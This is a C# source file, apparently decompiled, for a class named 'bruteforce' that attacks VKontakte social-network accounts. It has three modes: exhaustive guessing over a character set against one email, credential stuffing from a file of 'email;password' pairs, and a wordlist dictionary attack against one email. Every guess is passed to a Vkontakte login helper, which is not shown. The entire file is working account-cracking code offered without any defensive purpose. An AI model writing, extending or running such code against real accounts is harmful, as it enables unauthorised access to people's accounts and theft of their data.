using System.IO;
using System.Windows.Forms;

namespace Vkontakte;

public class bruteforce
{
	public int mode;

	public int length;

	public string target = string.Empty;

	public string password = string.Empty;

	private StreamReader sReader;

	public char[] chars;

	public int[] x;

	private Vkontakte vk;

	public int count;

	public int pass_count;

	public bruteforce(string chars_string, int i, string email, ListBox lBox)
	{
		vk = new Vkontakte(lBox);
		mode = 0;
		chars = getChars(chars_string);
		length = i;
		target = email;
		count = chars.Length;
		x = new int[i];
	}

	public bruteforce(StreamReader s, ListBox lBox)
	{
		vk = new Vkontakte(lBox);
		mode = 1;
		sReader = s;
	}

	public bruteforce(string email, StreamReader s, ListBox lBox)
	{
		vk = new Vkontakte(lBox);
		mode = 2;
		target = email;
		sReader = s;
	}

	public char[] getChars(string s)
	{
		char[] array = new char[s.Length];
		for (int i = 0; i < s.Length; i++)
		{
			array[i] = s[i];
		}
		return array;
	}

	public string write(int[] x, char[] y, int l)
	{
		string text = "";
		for (int i = 0; i < l; i++)
		{
			text += y[x[i]];
		}
		return text;
	}

	public bool plus(int[] x, int length, int m)
	{
		int num = length - 1;
		x[num]++;
		while (x[num] == m && num >= 0)
		{
			x[num] = 0;
			if (num > 0)
			{
				num--;
				x[num]++;
				continue;
			}
			return false;
		}
		return true;
	}

	public string getEmail(string s)
	{
		return s.Substring(0, s.Length - (s.Length - s.IndexOf(';')));
	}

	public string getPassword(string s)
	{
		return s.Substring(s.IndexOf(';') + 1, s.Length - s.IndexOf(';') - 1);
	}

	public void start()
	{
		switch (mode)
		{
		default:
			return;
		case 0:
			while (plus(x, length, count))
			{
				password = write(x, chars, length);
				vk.Login(target, password);
				pass_count++;
			}
			return;
		case 1:
			while (!sReader.EndOfStream)
			{
				string s = sReader.ReadLine();
				target = getEmail(s);
				password = getPassword(s);
				vk.Login(target, password);
				pass_count++;
			}
			return;
		case 2:
			break;
		}
		while (!sReader.EndOfStream)
		{
			password = sReader.ReadLine();
			vk.Login(target, password);
			pass_count++;
		}
	}
}
